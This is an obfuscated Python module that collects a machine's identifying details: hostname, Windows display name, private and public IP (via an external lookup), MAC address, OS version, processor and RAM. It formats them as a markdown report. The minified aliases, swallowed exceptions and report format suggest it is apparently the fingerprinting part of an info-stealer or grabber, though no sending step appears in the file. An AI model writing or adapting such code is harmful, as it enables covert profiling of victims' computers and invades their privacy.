import platform,ctypes;from re import findall;from psutil import virtual_memory;from socket import gethostname,gethostbyname;from uuid import getnode;from requests import get;from os import name as osname;M=str;x=round;F=Exception;i=None;w=ctypes.create_unicode_buffer;e=ctypes.c_ulong;J=ctypes.pointer;k=ctypes.windll;S=platform.processor;h=platform.machine;O=platform.version;W=platform.system
def 要():
 g={"platform":"---","platform-release":"---","platform-version":"---","architecture":"---","hostname":"---","display-name":"---","ip-address":"---","public-ip":"---","mac-address":"---","processor":"---","ram":"---",}
 try:g["platform"]=W();g["platform-version"]="v"+O();g["architecture"]=h();g["hostname"]=gethostname();g["display-name"]=b();g["ip-address"]=gethostbyname(gethostname());g["public-ip"]=get("https://api.ipify.org").content.decode("utf8");g["mac-address"]=":".join(findall("..","%012x"%getnode()));g["processor"]=S();g["ram"]=M(x(virtual_memory().total/(1024.0**3)))+" GB"
 except F:pass
 return f"**Display Name:** `{g['display-name']}`\n**Host Name:** `{g['hostname']}`\n**Public IP:** `{g['public-ip']}`\n**Private IP:** `{g['ip-address']}`\n**MAC Address:** `{g['mac-address']}`\n**Operating System:** `{g['platform']}`\n**OS Version:** `{g['platform-version']}`\n**Architecture:** `{g['architecture']}`\n**Processor:**  `{g['processor']}`\n**RAM:** `{g['ram']}`"
def b():
 if osname=="nt":
  try:f=k.secur32.GetUserNameExW;NameDisplay=3;size=J(e(0));f(NameDisplay,i,size);nameBuffer=w(size.contents.value);f(NameDisplay,nameBuffer,size);return nameBuffer.value
  except F:return "---"
 else:return "---"